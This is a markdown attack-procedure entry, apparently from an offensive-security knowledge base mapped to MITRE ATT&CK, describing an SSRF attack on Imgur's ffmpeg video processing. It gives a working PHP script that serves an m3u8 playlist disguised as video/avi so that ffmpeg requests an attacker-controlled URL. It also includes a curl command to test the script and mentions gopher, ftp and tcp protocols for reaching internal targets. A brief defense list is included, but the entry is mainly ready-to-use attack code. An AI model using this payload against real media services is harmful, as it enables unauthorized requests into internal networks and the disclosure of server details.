---
tags:
  - ssrf
  - m3u8
  - ffmpeg
type: procedure
tools:
  - '[[tools/PHP]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:09.597Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 3b0bf9ea-41a2-45c4-9794-9ebbf2393980
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Serve-Fake-Video-with-m3u8-Playlist

## Summary

This procedure uses a PHP script to serve m3u8 playlist content disguised as a video/avi file, exploiting ffmpeg's content-based parsing to initiate SSRF when Imgur processes the upload.

## Description

FFmpeg ignores the HTTP content-type and parses based on file content, allowing m3u8 playlists to trigger HTTP requests to embedded URLs. The script sets video/avi headers to pass Imgur's checks, enabling arbitrary requests to external/internal destinations, including protocols like ftp://, gopher://, tcp://.

## Requirements

1. PHP-enabled web server (e.g., Apache with PHP)
2. Public domain (e.g., gradeco.ru) for hosting
3. Basic knowledge of HTTP headers and m3u8 format

## Defense

Defensive measures and detection strategies:

- Proxy and filter outbound requests from media processing services
- Use sandboxed environments for ffmpeg execution
- Log and analyze unusual network traffic from application servers

## Objectives

1. Disguise m3u8 as valid video to bypass checks
2. Embed attacker-controlled URLs for SSRF
3. Disclose ffmpeg version via User-Agent

## Instructions

### Step 1: Create PHP Script

**Context**: Write the PHP file to output m3u8 with custom headers.

No command; create m3u8.php:
```php
<?php
header('Content-Type: video/avi');
header('Content-Length: 1234');
echo '#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nhttp://www.gradeco.ru:12346/BASICSSRF\n#EXT-X-ENDLIST';
?>
```

> Deploy at http://gradeco.ru/imgur/m3u8.php. When fetched, it serves the playlist, causing ffmpeg to request the embedded URL.

### Step 2: Test Serving

**Context**: Verify the script responds correctly.

Use curl to fetch:
```bash
curl -I http://gradeco.ru/imgur/m3u8.php
```

> Expected: Content-Type: video/avi, body with m3u8 content.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP]]

## Tags

- ssrf
- m3u8
- ffmpeg
